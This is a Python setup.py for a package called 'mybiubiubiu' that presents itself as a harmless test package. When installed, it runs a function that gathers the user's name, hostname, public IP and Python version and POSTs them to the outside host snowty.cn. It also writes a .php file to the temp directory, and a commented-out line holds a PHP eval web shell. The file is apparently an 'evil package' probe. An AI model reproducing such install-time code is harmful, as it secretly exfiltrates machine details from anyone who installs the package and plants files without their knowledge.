#! /usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import unicode_literals

import os
import sys
import time
import json
import getpass
import hashlib
import platform
import tempfile
import webbrowser
import setuptools
from setuptools.command.install import install


def request(url, method='GET', data=None, headers=None):
    headers = headers or {}
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def fun():
    username = getpass.getuser()
    hostname = platform.node()
    print username
    print hostname
    ip = request("https://enabledns.com/ip",method='GET')
    timenow = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
    filename = os.path.join(
        tempfile.gettempdir(),
        hashlib.md5(str(hostname).encode('utf-8', errors='ignore')).hexdigest()+".php"
    )
    
    # if os.path.exists(filename):
    #     print “filename exists”
    #     return
    try:
        f = open(filename, 'w')
        #evalstr = "sakura\n<?php @eval($_POST['c']);?>"
        evalstr = "hello world"
        f.write(evalstr)
        print "ok"
    except:
        print "err"
        pass
    
    data = {
        "username": str(username),
        "hostname": str(hostname),
        "ip":str(ip),
        "time":str(timenow),
        "filename":str(filename),
        "language": "Python %s.%s.%s" % (sys.version_info.major, sys.version_info.minor, sys.version_info.micro),
        "package": "{{ cookiecutter.package_name }}",
    }

    headers = {
        'Content-Type': 'application/json'
    }

    try:
        request(
            url="http://snowty.cn",
            method='POST',
            data=json.dumps(data).encode("utf-8", errors='ignore'),
            headers=headers
        )
        print "hhh"
    except:
        print "failed"
        pass

    # try:
    #     webbrowser.open("http://snowty.cn")
    # except:
    #     pass


fun()


# class AbortInstall(install):
#     def run(self):
#         raise SystemExit(
#             "[+] It looks like you try to install {{ cookiecutter.package_name }} without checking it.\n"
#             "[-] is that alright? \n"
#             "[*] Please visit http://evilpackage.fatezero.org/ \n"
#             "[/] Aborting installation."
#         )


setuptools.setup(
    name="mybiubiubiu",
    version="0.1.0",
    url="",

    author="biubiubiu",
    author_email="biubiubiu2@yopmail.com",

    description="test my function",
    long_description=open('README.rst').read(),

    packages=setuptools.find_packages(),
    # cmdclass={
    #     'install': AbortInstall
    # },

    install_requires=[],

    classifiers=[
        'Development Status :: 2 - Pre-Alpha',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
    ],
)